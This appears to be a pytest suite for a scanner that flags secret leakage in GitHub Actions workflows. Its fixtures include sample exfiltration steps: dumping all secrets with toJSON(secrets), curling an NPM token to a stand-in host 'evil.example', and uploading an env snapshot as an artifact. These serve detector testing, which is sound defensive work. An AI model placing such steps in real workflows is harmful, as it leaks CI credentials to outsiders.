"""Tests for ``packages.sca.supply_chain.gha_secret_flow``."""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, name: str, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / name
    p.write_text(body, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# toJSON(secrets) — the high-confidence anchor
# ---------------------------------------------------------------------------

def test_tojson_secrets_in_run_body_fires_high(tmp_path: Path) -> None:
    _write_wf(tmp_path, "exfil.yml", """\
name: x
on: [push]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ toJSON(secrets) }}" > /tmp/secrets.json
""")
    hits = scan_target(tmp_path, [], [])
    sinks = {h.sink_kind for h in hits}
    assert "tojson_secrets" in sinks
    assert any(h.severity == "high" for h in hits
               if h.sink_kind == "tojson_secrets")


def test_tojson_secrets_with_lowercase_tojson(tmp_path: Path) -> None:
    """``toJson`` (lowercase ``s``) is equivalent to ``toJSON`` per
    GHA expression semantics."""
    _write_wf(tmp_path, "exfil.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJson(secrets) }}'
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "tojson_secrets" for h in hits)


# ---------------------------------------------------------------------------
# Env binding propagation
# ---------------------------------------------------------------------------

def test_env_bound_secret_used_in_run_body_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: curl https://evil.example/?t=$NPM_TOKEN
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) == 1
    # Egress shape in the body raises this to high.
    assert run_hits[0].severity == "high"


def test_tojson_env_with_secret_binding_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      SECRET: ${{ secrets.MY_SECRET }}
    steps:
      - run: echo "${{ toJSON(env) }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "tojson_env" for h in hits)


def test_tojson_env_without_secret_binding_no_finding(tmp_path: Path) -> None:
    """``toJSON(env)`` is fine when env contains nothing
    secret-derived."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      MODE: production
    steps:
      - run: echo "${{ toJSON(env) }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "tojson_env" for h in hits)


# ---------------------------------------------------------------------------
# Computed access
# ---------------------------------------------------------------------------

def test_computed_secret_access_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets[github.event.inputs.name] }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "computed_access" for h in hits)


# ---------------------------------------------------------------------------
# Trusted-consumer allowlist
# ---------------------------------------------------------------------------

def test_secret_to_actions_checkout_is_legit(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


def test_secret_to_softprops_release_is_legit(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@v2
        with:
          token: ${{ secrets.GH_RELEASE_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


def test_secret_to_untrusted_action_fires_high(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: nobody/unknown-action@v1
        with:
          token: ${{ secrets.NPM_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
    assert untrusted and untrusted[0].severity == "high"


def test_secret_to_local_action_fires_medium(tmp_path: Path) -> None:
    """Local actions can't be on the trusted list (their body is
    in-tree).  Flag at medium so reviewers see them."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/internal
        with:
          token: ${{ secrets.X }}
""")
    hits = scan_target(tmp_path, [], [])
    locals_ = [h for h in hits if h.sink_kind == "local_action"]
    assert locals_ and locals_[0].severity == "medium"


# ---------------------------------------------------------------------------
# Upload-artifact + cache sinks
# ---------------------------------------------------------------------------

def test_upload_artifact_with_secret_env_binding_fires(
    tmp_path: Path,
) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOK: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: env > /tmp/snapshot
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: /tmp/snapshot
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "upload_artifact" for h in hits)


# ---------------------------------------------------------------------------
# echo-with-mask is legitimate — suppression
# ---------------------------------------------------------------------------

def test_mask_in_run_body_suppresses(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "::add-mask::${{ secrets.NPM_TOKEN }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


# ---------------------------------------------------------------------------
# Per-job env scoping
# ---------------------------------------------------------------------------

def test_env_binding_does_not_cross_jobs(tmp_path: Path) -> None:
    """Job A binds a secret to env; Job B uses ``$X`` in a run body.
    Without binding propagation, Job B's run is innocent."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    env:
      X: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: echo $X
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo $X
""")
    hits = scan_target(tmp_path, [], [])
    # Job A's step DOES fire (run body refs a secret-bound env);
    # Job B's step does NOT (no env binding in job B).
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    job_ids = [h.job_id for h in run_hits]
    assert "a" in job_ids and "b" not in job_ids


# ---------------------------------------------------------------------------
# Workflow-level resilience
# ---------------------------------------------------------------------------

def test_no_workflows_dir_no_findings(tmp_path: Path) -> None:
    assert scan_target(tmp_path, [], []) == []


def test_malformed_yaml_is_skipped_not_crashed(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", "this: is: not: valid: yaml: :")
    # Must not raise — malformed YAML is silently skipped.
    scan_target(tmp_path, [], [])


def test_workflow_with_no_jobs_no_findings(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", "name: x\non: push\n")
    assert scan_target(tmp_path, [], []) == []
